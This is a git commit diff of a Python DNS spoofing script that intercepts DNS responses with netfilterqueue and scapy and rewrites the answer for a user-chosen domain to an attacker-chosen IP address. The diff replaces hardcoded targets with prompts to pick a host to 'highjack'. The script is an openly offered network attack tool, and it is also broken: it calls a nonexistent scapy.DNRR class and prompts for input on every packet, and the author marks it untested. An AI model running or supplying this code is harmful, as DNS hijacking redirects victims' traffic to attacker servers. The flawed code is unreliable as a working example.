7181a02f2d47c11142789aa61555e20e2b29a304
john r <johnroge@outlook.com>
2018-10-04 13:02:56 -0700

    added variables (untested) to dns_spoof.py

--- dns_spoof.py
+++ dns_spoof.py
@@ -1,24 +1,26 @@
 #!/usr/bin/env python
-
 """
 Check packets for DNS requests containing "www.bing.com" and replace
 response with another IP
-
-Last updated: Aug 2018
-- adding documentation, TODO items
+johnroge AT outlook
+v1.1
+Last updated: Oct 2018
+NOTE: Latest changes (variable inputs for host and address) not yet
+        tested due to netfilterqueue issues.
 """
 import netfilterqueue
 import scapy.all as scapy
 
 
-# TODO: Get user input rather than static entries
 def process_packet(packet):
+    host = input('Please enter a host or domain to highjack: ')
+    IP_address = input('Enter IP address to substitute for the host: ')
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        if "www.bing.com" in qname:
+        if host in qname:
             print("[+] Spoofing target")
-            answer = scapy.DNRR(rrname=qname, rdata="10.0.0.1")
+            answer = scapy.DNRR(rrname=qname, rdata=IP_address)
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
